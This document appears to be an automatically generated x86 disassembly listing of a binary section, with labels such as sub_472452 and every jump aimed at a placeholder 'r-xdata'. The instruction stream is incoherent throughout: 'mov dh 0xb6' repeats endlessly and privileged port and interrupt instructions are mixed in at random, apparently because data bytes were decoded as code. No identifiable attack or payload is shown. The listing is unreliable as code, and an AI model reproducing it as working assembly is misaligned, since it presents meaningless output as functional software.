stosd [ edi ]
inc ebp
inc eax
scasd [ edi ]
jpo r-xdata
cli
lodsd [ esi ]
cld
inc eax
scasd [ edi ]
jpo r-xdata
fst [ es : ebx - 0x26 ]
jge r-xdata
sahf
xor ah [ esi ]
mov dh 0xb6
adc bh cl
call 0xffffffffb66d4ae3
mov dh 0xb6
jno r-xdata
jbe r-xdata
xchg ecx eax
sub al 0xcf
in eax 0x13
sub [ es : edx + 0x262637d4 ] esp
fst [ ebx - 0x26 ]
salc
dec esp
fnstenv [ es : eax + 0x5e ]
lodsd [ esi ]
fisub [ ebx + 0x5fa229d9 ]
xor [ esi ] esp
fst [ es : ebx + 0x2a ]
iretd
sub_472452
sbb [ esi ] ah
mov dh 0xb6
mov dh 0xd
aam 0x29
sahf
xor ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jpo r-xdata
stosd [ edi ]
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
arpl ax bx
dec esi
and ah [ edi ]
stosd [ edi ]
mov [ 0xffffffffd9d9db96 ] eax
iretd
iretd
jbe r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
dec esp
push eax
iretd
adc eax 0x7baf40fd
jl r-xdata
stc
inc eax
scasd [ edi ]
jpo r-xdata
lodsd [ esi ]
jge r-xdata
mov [ 0x2626b202 ] al
jbe r-xdata
mov dh 0x29
mov [ 0x26260d5d ] eax
dec esi
and ah [ edi ]
stosd [ edi ]
inc ebp
inc eax
scasd [ edi ]
jpo r-xdata
cli
lodsd [ esi ]
cld
inc eax
scasd [ edi ]
jpo r-xdata
jbe r-xdata
fst [ es : ebx - 0x26 ]
jge r-xdata
adc bh cl
call 0xffffffffb66d4ae3
mov dh 0xb6
jno r-xdata
xchg ecx eax
sub al 0xcf
in eax 0x13
sub [ es : edx + 0x262637d4 ] esp
fst [ ebx - 0x26 ]
salc
dec esp
fnstenv [ es : eax + 0x5e ]
lodsd [ esi ]
fisub [ ebx + 0x5fa229d9 ]
xor [ esi ] esp
fst [ es : ebx + 0x2a ]
iretd
sub_4724c3
or [ edi ] bh
inc eax
scasd [ edi ]
arpl si si
jle r-xdata
mov dh 0x40
scasd [ edi ]
arpl ax dx
jle r-xdata
scasd [ edi ]
arpl sp si
dec esp
inc ebx
jle r-xdata
sub [ ebx + 0x26260d5d ] esp
aam 0x67
loope r-xdata
dec esp
xchg edx eax
fcomp st1
fnstenv [ esi - 0x2b9c50c0 ]
jle r-xdata
arpl ax bx
dec esi
and ah [ edi ]
stosd [ edi ]
mov [ 0xffffffffd9d9db96 ] eax
iretd
iretd
iretd
xchg ecx eax
sub al 0xcf
in eax 0x13
sub [ es : edx + 0x262637d4 ] esp
fst [ ebx - 0x26 ]
salc
dec esp
fnstenv [ es : eax + 0x5e ]
lodsd [ esi ]
fisub [ ebx + 0x5fa229d9 ]
xor [ esi ] esp
fst [ es : ebx + 0x2a ]
iretd
lodsd [ esi ]
dec esi
and ah [ edi ]
stosd [ edi ]
xor [ esi ] cl
mov dh 0x29
sahf
xor ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jpo r-xdata
mov [ 0x2626b202 ] al
jbe r-xdata
stosd [ edi ]
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
jbe r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
dec esp
push eax
iretd
adc eax 0x7baf40fd
jl r-xdata
stc
inc eax
scasd [ edi ]
jpo r-xdata
lodsd [ esi ]
jge r-xdata
mov [ 0x26260d5d ] eax
mov dh 0x29
inc ebp
inc eax
scasd [ edi ]
jpo r-xdata
cli
lodsd [ esi ]
cld
inc eax
scasd [ edi ]
jpo r-xdata
jbe r-xdata
fst [ es : ebx - 0x26 ]
jge r-xdata
adc bh cl
call 0xffffffffb66d4ae3
mov dh 0xb6
jno r-xdata
sub_47251c
push edx
push es
outsb
push eax
loope r-xdata
mov [ 0x26261a2d ] eax
iretd
sahf
jle r-xdata
add [ edx + 0x26 ] esp
mov dh 0xb6
lodsd [ esi ]
loopne r-xdata
dec eax
jo r-xdata
ficom [ 0x63af40e6 ]
arpl [ esi ] sp
movsd [ edi ] es : [ esi ]
fisub [ edi ]
sub [ ebx - 0x26262dfd ] esp
iretd
dec esp
iretd
sub [ esi ] cl
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov [ 0x2ef7cfe6 ] eax
mov dh 0xb6
jle r-xdata
fxch st7
and bl [ edx ]
mov dh 0x29
fmul [ esi + 0x22 ]
daa
stosd [ edi ]
mov [ 0xffffffffd9d9db96 ] eax
iretd
scasd [ edi ]
arpl dx bx
adc eax 0x63af40e6
sub_4725c7
dec ebx
inc eax
in al dx
inc eax
scasd [ edi ]
imul ebp edx 0xffffffce
add [ edx ] 0x26
jg r-xdata
push esi
iretd
scasd [ edi ]
arpl dx di
jle r-xdata
out 0x29 al
mov [ 0x2626048e ] eax
stosd [ edi ]
arpl dx cx
jbe r-xdata
adc [ edx ] esp
dec esi
imul eax [ edx + 0x4 ] 0x1e60af71
into
mov cr4 esi
iretd
loopne r-xdata
mov [ 0x31a8cfe6 ] eax
mov dh 0x2
jg r-xdata
mov dh 0xcf
into
sbb al 0x34
mov [ es : 0x31a8cfe6 ] eax
inc eax
scasd [ edi ]
pop ebx
cmpsb [ esi ] [ edi ]
rcr ecx 0x1
fnstenv [ esi + 0x40b6b6b6 ]
scasd [ edi ]
jae r-xdata
mov dh 0xcf
sub [ eax ] cl
mov dh 0xce
fistp [ ecx ]
movsd [ edi ] es : [ esi ]
loop r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
and al 0x26
iretd
movsd [ edi ] [ esi ]
inc edx
add bh [ esi ]
cmpsb [ es : esi ] [ edi ]
pop ecx
and ah [ esi ]
sub [ eax + 0x26262424 ] esp
movsd [ edi ] [ esi ]
inc edx
add al [ edx ]
stosd [ edi ]
bound eax [ edx ]
add dh [ esi - 0x31 ]
sbb [ esi + 0x26 ] ah
mov dh 0xb6
sub [ ebx + 0x262627cd ] esp
iretd
sub_4726fd
sub dh [ ebp + 0x71 ]
adc eax 0xcfcf71d9
adc eax 0x43a52626
fisub [ esi ]
movsd [ edi ] [ esi ]
loop r-xdata
mov ah 0x32
mov dh 0xb6
mov dh 0x7e
inc eax
scasd [ edi ]
arpl [ esi ] si
iretd
iretd
sub_47271a
inc esi
jne r-xdata
lodsd [ esi ]
out dx al
inc eax
scasd [ edi ]
imul edx esi 0xffffffcf
int3
jno r-xdata
mov dh 0xad
arpl dx bx
iretd
test [ edx ] dl
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
adc eax 0xaf7f7fe6
jpo r-xdata
mov dh 0x73
lodsd [ esi ]
0xcaa5
inc eax
sbb eax 0xb4cf2060
xor ah [ esi ]
mov dh 0xb6
mov dh 0x7e
inc eax
scasd [ edi ]
arpl [ esi ] si
iretd
sub_472746
xchg edx eax
fcmovnu st1
fnstenv [ esi - 0x31bd9f51 ]
loope r-xdata
pop ebx
fisub [ edi ]
sub [ ebx + 0x26263657 ] esp
lodsd [ esi ]
pushad
adc cl bh
imul edi [ ecx ] 0xb6b62626
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
out dx al
inc eax
scasd [ edi ]
imul edx esi 0xffffffcf
int3
dec esi
int 0x27
outsd
mov dl 0x71
scasd [ edi ]
pushad
dec esi
into
lahf
and al 0x26
iretd
sub_472767
and eax 0xb6d9d9d8
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jno r-xdata
sub [ ebx + 0x26262621 ] esp
jne r-xdata
movsd [ edi ] [ esi ]
pop ebx
fisub [ edi ]
sub [ ebx + 0x26263657 ] esp
lodsd [ esi ]
pushad
adc cl bh
imul edi [ ecx ] 0xb6b62626
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
out dx al
inc eax
scasd [ edi ]
imul edx esi 0xffffffcf
int3
adc [ esi ] esp
mov dh 0xad
stc
iretd
mov al 0x8a
iretd
sub_4727d6
xor al 0xd0
fstpnce st1
mov dh 0x99
and esp [ esi ]
r-xdata
fldcw [ ecx ]
xchg ecx eax
cmp al [ gs : eax - 0x5d ]
out 0xcf al
adc ch [ 0xffffffffb6b62626 ]
loopne r-xdata
fnstenv [ eax + 0x262626a6 ]
scasd [ edi ]
bound eax [ edx ]
sbb eax 0x21a329e5
jne r-xdata
mov dh 0xb6
jno r-xdata
0xcf9e
adc [ esi ] esp
mov dh 0xad
stc
iretd
mov al 0x8a
iretd
mov dh 0x15
fstp [ edi ]
pop edx
add dl [ edx ]
sub [ ebx + 0x262629f8 ] esp
pop ds
pop edx
add dl [ esi ]
iretd
fmulp st7
xor [ esi ] sp
scasd [ edi ]
jpo r-xdata
lodsd [ esi ]
loopne r-xdata
jno r-xdata
push ss
push 0xbbcf
and ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x262664f4 ] al
iretd
in eax 0xb6
mov dh 0xad
call 0xffffffffad6af097
fsub st7
leave
and al 0x25
jmp 0x2563c0e3
aas
xor [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
iretd
sub_4729df
push edx
sbb [ esi ] ah
jns r-xdata
add [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
jge r-xdata
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
push 0xb6262601
mov dh 0xb6
mov dh 0xb6
dec esi
movsd [ edi ] es : [ esi ]
out 0x24 eax
movsd [ edi ] [ esi ]
in al 0x24
iretd
in eax 0xb6
mov dh 0xb6
mov dh 0x79
inc eax
scasd [ edi ]
pop ebx
int3
sub_4729f1
dec esp
dec esi
jns r-xdata
aaa
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
loopne r-xdata
scasd [ edi ]
pop ebx
0x414c
mov dh 0xb6
mov dh 0xb6
dec esi
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
push 0xb6262601
mov dh 0xb6
sub_472a07
cmp esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jae r-xdata
lodsd [ esi ]
fisub [ ebx - 0x3c5dd627 ]
add [ esi ] ah
iretd
0x7777
sub_472a34
aaa
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
loopne r-xdata
mov dh 0xb6
mov dh 0xb6
dec esi
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
push 0xb6262601
mov dh 0xb6
sub_472a76
dec esi
les ebp [ ecx - 0x308e8181 ]
aam 0xc8
fstpnce st1
mov dh 0x4e
jge r-xdata
mov dh 0xb6
lodsd [ esi ]
test bh 0xa
fcomp st1
fnstenv [ esi + 0x224c75b6 ]
iretd
lodsb [ esi ]
salc
iretd
sub_472a88
sbb eax 0xb6d9d9d6
inc eax
scasd [ edi ]
jae r-xdata
salc
fstpnce st1
mov dh 0x40
jl r-xdata
fstpnce st1
mov dh 0xb6
jne r-xdata
push ebp
inc eax
scasd [ edi ]
jae r-xdata
movsd [ edi ] [ esi ]
fisub [ edi ]
sub [ edx - 0x2626212e ] esp
stosd [ edi ]
stosd [ edi ]
out dx al
fcmovnu st1
fxch st7
aad 0x7
mov dh 0x71
and cl bh
mov esi 0xb6d9d9c9
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
adc eax 0x70d975fd
push 0xffffffa3
out 0x29 al
mov [ 0xffffffffd9d9df0c ] al
stosd [ edi ]
mov [ 0xffffffffd9d9dbee ] eax
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
lodsd [ esi ]
test [ eax - 0x51 ] 0xc1cfc473
cmp eax 0xceb62626
jbe r-xdata
fcomp st1
fnstenv [ esi - 0x4949494a ]
mov dh 0x4e
jne r-xdata
jne r-xdata
jmp r-xdata
mov dh 0xb6
jno r-xdata
fstpnce st1
mov [ 0xffffffffc844cfe6 ] eax
fstpnce st1
mov dh 0x77
scasd [ edi ]
mov al [ 0x262626e6 ]
sbb eax 0xcacbcfe5
fstpnce st1
mov dh 0xb6
jbe r-xdata
mov cl 0xa6
iretd
jno r-xdata
cmp al 0x75
fnstenv [ eax + 0x262626c6 ]
lodsd [ esi ]
jae r-xdata
mov dh 0xcf
loopne r-xdata
aam 0xc8
fstpnce st1
mov dh 0x4e
jge r-xdata
lahf
push ss
inc edx
lodsd [ esi ]
daa
lodsd [ esi ]
sub ch [ ebp + 0x26ad2a66 ]
lodsd [ esi ]
scasw [ edi ]
and al [ edx ]
lodsd [ esi ]
and al [ edx ]
jg r-xdata
mov dh 0xb6
movsd [ edi ] [ esi ]
fmul [ 0x26368dcf ]
dec esp
bound eax [ edx ]
adc [ esi ] edx
iretd
stosd [ edi ]
arpl dx bx
jbe r-xdata
and cl bh
ficom [ edi ]
mov dh 0xb6
fnstenv [ eax + 0x262626a6 ]
dec esp
and ch [ ebx - 0x3089259d ]
in al dx
xor ah [ esi ]
iretd
stosd [ edi ]
mov [ 0xffffffffd9d9dbee ] eax
into
or al 0x26
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
dec esi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
push 0xb6262601
mov dh 0xb6
test bh 0xa
fcomp st1
fnstenv [ esi + 0x224c75b6 ]
iretd
mov dh 0xb6
lodsd [ esi ]
lodsb [ esi ]
salc
iretd
mov dh 0xb6
into
mov ebp 0x2526262c
out 0x76 al
ja r-xdata
iretd
mov dh 0xb6
mov dh 0xad
or eax 0x26368dcf
stosd [ edi ]
xchg edx eax
fcompp
fxch st6
xor eax 0x7f26262e
mov dh 0x1d
arpl si bx
iretd
daa
iretd
sub_472b80
popfd
fcomp st1
fnstenv [ esi - 0x4949494a ]
mov dh 0x4e
jne r-xdata
scasd [ edi ]
mov al [ 0x262626e6 ]
sbb eax 0xcacbcfe5
fstpnce st1
mov dh 0xb6
jbe r-xdata
mov cl 0xa6
iretd
dec esp
and cl bh
ficom [ edi ]
mov dh 0xb6
fnstenv [ eax + 0x262626a6 ]
bound eax [ edx ]
adc [ esi ] edx
iretd
sub_472b97
xor al 0x38
jno r-xdata
lodsd [ esi ]
salc
stosd [ edi ]
arpl dx bx
jbe r-xdata
jno r-xdata
iretd
salc
xor [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
scasd [ edi ]
pop ebx
fcmovu st1
jo r-xdata
mov dh 0x1d
arpl si bx
iretd
daa
iretd
mov dh 0xb6
mov dh 0xad
fcompp
jno r-xdata
jno r-xdata
imul ebp esi 0xffffffab
arpl [ esi - 0x26371232 ] cx
fldenv [ ebx - 0x1c5dd61a ]
aad 0xd9
fldcw [ ebx + 0x63ab9e6b ]
movsd [ edi ] [ esi ]
fcompp
iretd
xlat
fstpnce st1
mov dh 0xb6
mov dh 0x71
pop ebx
stosd [ edi ]
arpl dx bx
jbe r-xdata
dec esp
and cl bh
ficom [ edi ]
mov dh 0xb6
fnstenv [ eax + 0x262626a6 ]
scasd [ edi ]
mov al [ 0x262626e6 ]
sbb eax 0xcacbcfe5
fstpnce st1
mov dh 0xb6
jbe r-xdata
bound eax [ edx ]
adc [ esi ] edx
iretd
mov dh 0xb6
into
mov ebp 0x2526262c
out 0x76 al
ja r-xdata
iretd
sub_472be5
add [ eax ] al
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
fcompp
jno r-xdata
imul ebp esi 0xffffffab
arpl [ esi - 0x26371232 ] cx
fldenv [ ebx - 0x1c5dd61a ]
aad 0xd9
fldcw [ ebx + 0x63ab9e6b ]
movsd [ edi ] [ esi ]
fcompp
iretd
sub_472c7d
in al dx
mov dh 0xb6
xor eax 0xef152626
pop ds
imul ebp [ edx ] 0x29
mov al [ 0xffffffffd9d9d55c ]
jo r-xdata
mov dh 0xb6
js r-xdata
arpl si bx
iretd
push ebx
iretd
mov dh 0x29
nop
cmp bh cl
mov ecx 0xb626261f
mov dh 0xb6
mov dh 0xad
out 0xcf eax
jpe r-xdata
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
pop ebx
enter 0x404c 0xcf
sbb al 0x11
jns r-xdata
push ds
jpo r-xdata
in eax 0xb6
mov dh 0xb6
mov dh 0xaf
pop ebx
fidiv [ esi + 0x75 ]
fnstenv [ eax + 0x62 ]
lodsd [ esi ]
arpl dx bx
iretd
mov [ 0x24b4cfe6 ] eax
mov dh 0x27
bound eax [ edx ]
fldenv [ edx + 0x2 ]
cmp cl bh
xor ecx [ 0xffffffffb6b62626 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
pop edx
add al [ edx ]
sub [ es : edx + 0x2626352f ] esp
sub [ eax - 0x3089e19b ] edx
rcr eax 0x1
fstpnce st1
mov dh 0xce
iret
iretd
sub_472cd0
sti
push ss
into
enter 0x2627 0x26
jg r-xdata
jno r-xdata
iretd
mov dh 0x70
adc eax 0xdead71fd
iretd
mov [ 0x24b4cfe6 ] eax
mov dh 0x27
bound eax [ edx ]
fldenv [ edx + 0x2 ]
cmp cl bh
xor ecx [ 0xffffffffb6b62626 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
pop edx
add al [ edx ]
sub [ es : edx + 0x2626352f ] esp
sub [ eax - 0x3089e19b ] edx
rcr eax 0x1
fstpnce st1
mov dh 0xce
iret
sub_472d35
and eax 0xcf752626
mov dh 0x26
jg r-xdata
adc eax 0x7d7879e6
mov [ 0x2ea229e6 ] eax
dec esp
fnstenv [ es : eax + 0x2626268a ]
iretd
mov dh 0xb6
sub [ ebx + 0x262638c0 ] esp
jns r-xdata
std
jno r-xdata
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
cmp esp [ esi ]
adc eax 0x7d7879e6
sbb al 0xd9
fxch st7
adc ch 0xd9
fnstenv [ esi - 0x4949494a ]
dec esi
iretd
sub [ es : eax - 0x3089e19b ] edx
rcr eax 0x1
fstpnce st1
mov dh 0xce
iret
fmulp st7
sub_472d54
mov dh 0xb6
mov dh 0xd9
jno r-xdata
mov dh 0x70
adc eax 0xdead71fd
iretd
mov [ 0x24b4cfe6 ] eax
mov dh 0x27
bound eax [ edx ]
fldenv [ edx + 0x2 ]
cmp cl bh
xor ecx [ 0xffffffffb6b62626 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
pop edx
add al [ edx ]
sub [ es : edx + 0x2626352f ] esp
sub [ eax - 0x3089e19b ] edx
rcr eax 0x1
fstpnce st1
mov dh 0xce
iret
sub_472d9c
xor edx [ edi ]
mov dh 0xb6
mov dh 0xb6
dec esi
cmc
pop ss
loopne r-xdata
imul ebx edx 0x77
fst [ ebx - 0x2e ]
iretd
jno r-xdata
jno r-xdata
mov al [ 0x2626268a ]
into
inc ebx
fcmovu st1
fxch st7
out dx al
fcmovu st1
fnstenv [ esi + 0x39aa29b6 ]
mov dh 0x70
adc eax 0xdead71fd
iretd
mov [ 0x24b4cfe6 ] eax
mov dh 0x27
bound eax [ edx ]
fldenv [ edx + 0x2 ]
cmp cl bh
xor ecx [ 0xffffffffb6b62626 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
pop edx
add al [ edx ]
sub [ es : edx + 0x2626352f ] esp
sub [ eax - 0x3089e19b ] edx
mov dh 0xb6
sub [ ebx + 0x262638c0 ] esp
jns r-xdata
std
jno r-xdata
cmp esp [ esi ]
adc eax 0x7d7879e6
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
sbb al 0xd9
fxch st7
adc ch 0xd9
fnstenv [ esi - 0x4949494a ]
dec esi
iretd
rcr eax 0x1
fstpnce st1
mov dh 0xce
iret
sub [ es : eax - 0x3089e19b ] edx
fmulp st7
sub_472dd7
fstp st1
fnstcw [ edi - 0x31 ]
call [ eax ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
cmp esp [ esi ]
adc eax 0x7d7879e6
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
sbb al 0xd9
fxch st7
adc ch 0xd9
fnstenv [ esi - 0x4949494a ]
dec esi
iretd
mov dh 0xb6
sub [ ebx + 0x262638c0 ] esp
jns r-xdata
std
jno r-xdata
sub [ es : eax - 0x3089e19b ] edx
rcr eax 0x1
fstpnce st1
mov dh 0xce
iret
fmulp st7
sub_472e4c
enter 0x2610 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
and eax 0x293a0262
xchg ecx eax
out 0x76 al
lodsd [ esi ]
loopne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa7
pop ecx
xor [ esi ] esp
iretd
sub_472e9f
fstp st1
sub [ ebx - 0x2626252e ] esp
adc eax 0x3717cfe6
mov dh 0xb6
inc eax
scasd [ edi ]
jpo r-xdata
out 0xcf al
js r-xdata
dec esp
adc bh [ ebp - 0x31 ]
adc [ 0x40b62626 ] 0xcf1732af
sbb [ edi ] ebx
mov dh 0x71
iretd
into
mov ebp 0xa526263a
fisub [ edi ]
sub [ edx + 0x2626375c ] esp
adc eax 0x262afe6
adc eax 0x288bcfe6
movsd [ edi ] es : [ esi ]
pop ebx
sub [ es : edx - 0x2626375c ] esp
iretd
loope r-xdata
xchg ecx eax
inc edx
jbe r-xdata
into
or [ esi ] ah
scasd [ edi ]
dec [ ecx + 0x55 ]
dec ecx
inc eax
loope r-xdata
loope r-xdata
lodsd [ esi ]
or [ gs : eax + 0x25 ] al
bound eax [ edx ]
add ch [ ecx ]
xchg ecx eax
out 0x76 al
lodsd [ esi ]
loopne r-xdata
mov al [ 0x262626ee ]
iretd
cli
push edx
push es
outsb
push eax
loope r-xdata
mov dh 0xb6
jg r-xdata
0x43544751 0x63e1
scasd [ edi ]
bound eax [ edx ]
cmp bl [ edi ]
sub [ eax + 0x26260f40 ] esp
movsd [ edi ] [ esi ]
inc edx
add dh [ esi ]
stosd [ edi ]
bound eax [ edx ]
jbe r-xdata
out 0xaf al
bound eax [ edx ]
hlt
int 0xd9
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
loop r-xdata
sub [ edx + 0x26263646 ] esp
iretd
scasd [ edi ]
imul edi eax 0xffffffcf
mov dh 0x7f
inc eax
imul edx [ ecx + 0x47 ] 0xffffffe1
arpl si bp
push esp
inc ebx
jo r-xdata
clc
iretd
sub_47306f
sub edi [ esi ]
mov dh 0xb6
mov dh 0xcf
xor al 0xd1
fstpnce st1
mov dh 0xb6
lodsd [ esi ]
scasw [ edi ]
arpl dx bx
lodsd [ esi ]
arpl dx bx
out dx eax
fcompp
jo r-xdata
push ebx
fcmovu st1
fnstenv [ esi - 0x2649494a ]
push ebx
sub dh [ ebp - 0x27 ]
jo r-xdata
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
imul ebx [ esi ] 0x26
jne r-xdata
lodsd [ esi ]
out dx ax
in eax 0xb6
mov dh 0xb6
iretd
jne r-xdata
iretd
movaps [ esi ] xmm4
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
adc eax 0xe5ef66e6
mov dh 0xb6
mov dh 0xcf
fdiv [ esi ]
sub [ es : ecx + 0x26261dd9 ] esp
iretd
sub_4730d3
mov dh 0xd3
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
add [ edi + 0x4e ] esp
rol [ eax - 0x51 ] 0x6b
salc
into
scasd [ edi ]
mov al [ 0x262626ba ]
into
or eax 0xafd9d9df
mov al [ 0x26262686 ]
movsd [ edi ] [ esi ]
loop r-xdata
jne r-xdata
lodsd [ esi ]
loopne r-xdata
jge r-xdata
dec esi
std
adc [ esi ] esp
mov dh 0xb6
cmp al 0x26
mov dh 0xb6
movsd [ edi ] [ esi ]
fcompp
iretd
movsd [ edi ] [ esi ]
sub esp [ esi ]
mov dh 0xb6
iretd
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jae r-xdata
stosd [ edi ]
mov [ 0xffffffffd9d9dbca ] eax
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x262626ca ]
movsd [ edi ] [ esi ]
loop r-xdata
mov dh 0xb6
in al dx
push ss
iretd
inc eax
scasd [ edi ]
imul edx esi 0xffffffce
mov dh 0xb6
mov dh 0xb6
cmpsd [ esi ] [ edi ]
jno r-xdata
iret
stosd [ edi ]
mov [ 0xffffffffd9d9dace ] eax
jbe r-xdata
0x2416
fnstenv [ esi - 0x5849494a ]
xchg edx eax
sbb al 0x26
iret
sub_47313d
mov ss cx
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
dec esp
sub al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x262626ca ]
movsd [ edi ] [ esi ]
loop r-xdata
inc eax
scasd [ edi ]
imul edx esi 0xffffffce
in al dx
push ss
iretd
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jae r-xdata
stosd [ edi ]
mov [ 0xffffffffd9d9dbca ] eax
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
cmpsd [ esi ] [ edi ]
jno r-xdata
iret
stosd [ edi ]
mov [ 0xffffffffd9d9dace ] eax
jbe r-xdata
0x2416
fnstenv [ esi - 0x5849494a ]
xchg edx eax
sbb al 0x26
iret
sub_4731b4
insd
add [ esi ] ah
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl ax di
jle r-xdata
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
jno r-xdata
or bh cl
fnstsw [ edi ]
mov dh 0x29
mov [ 0x26262115 ] al
mov dh 0xc2
fstpnce st1
mov dh 0xb6
mov dh 0xb6
fnstenv [ eax + 0x262626a6 ]
iretd
cmc
fstpnce st1
out 0x29 al
mov [ 0x26262636 ] eax
mov [ 0x36a329ef ] eax
iretd
fnstenv [ esi + 0x262afb6 ]
mov [ 0x47a229e6 ] eax
movsd [ edi ] es : [ esi ]
pop edx
add al [ edx ]
sub [ es : edx + 0x26262670 ] esp
movsd [ edi ] [ esi ]
pop ecx
sub [ es : edx + 0x26262621 ] esp
lodsd [ esi ]
out dx al
into
push edi
pop esp
r-xdata
lodsd [ esi ]
loopne r-xdata
mov [ es : 0x2ea329e6 ] eax
dec esp
fnstenv [ es : eax + 0x2626268a ]
dec esi
cmpsb [ es : esi ] [ edi ]
dec esp
fst [ es : edx + 0x2 ]
push es
fnstenv [ eax + 0x52 ]
fldenv [ edx + 0x2 ]
xor ch [ ebp + 0x1d320262 ]
popad
and ch [ ecx ]
movsb [ edi ] [ esi ]
lea ebp [ ecx ]
adc eax 0x262afe6
xor al [ eax + 0x1f ]
pushad
sub [ edx + 0x26263c95 ] esp
cdq
sahf
sub eax 0x621f2626
add bh [ edx ]
sub [ edx - 0x26263e59 ] esp
iretd
imul ebp [ edx ] 0xa229efa3
mov [ es : 0x36a329e6 ] eax
mov [ es : 0x36a329ef ] eax
adc eax 0x210fcfef
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jns r-xdata
loop r-xdata
fstp st1
fstpnce st1
push edx
add bh [ esi ]
lodsd [ esi ]
loopne r-xdata
jg r-xdata
mov dh 0xb6
mov dh 0xce
out 0xcf al
adc esi [ edi ]
out dx eax
sub_4732d7
or al 0xc9
fstpnce st1
mov dh 0xb6
adc eax 0x29e6a3ef
mov dh 0x71
stosd [ edi ]
mov [ 0xffffffffd9d9dbf2 ] eax
jne r-xdata
jne r-xdata
mov [ es : 0xffffffffd9a329e6 ] eax
iretd
lodsd [ esi ]
0x9cf
and [ ebp - 0x27 ] esi
mov cl 0xc6
mov [ es : 0xda329e6 ] eax
cmp ah [ esi ]
dec esp
jpe r-xdata
daa
stosd [ edi ]
pop ebx
out dx al
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st7
out dx al
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
jo r-xdata
mov [ 0x26262433 ] eax
stosd [ edi ]
pop ebx
into
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st6
add cl [ edi ]
mov [ es : 0xffffffffd9a329e6 ] eax
dec ebp
adc al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
imul edi esi 0x77
iretd
mov edi 0xefe7ade7
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x26260318 ] eax
jbe r-xdata
fnstenv [ esi - 0x5c10ea4a ]
out 0x29 al
pop ss
rcr cl cl
fld [ eax - 0x51 ]
arpl sp cx
jle r-xdata
iretd
push edx
iretd
sub_473317
mov [ ecx ] ss
mov dh 0xb6
mov dh 0xcf
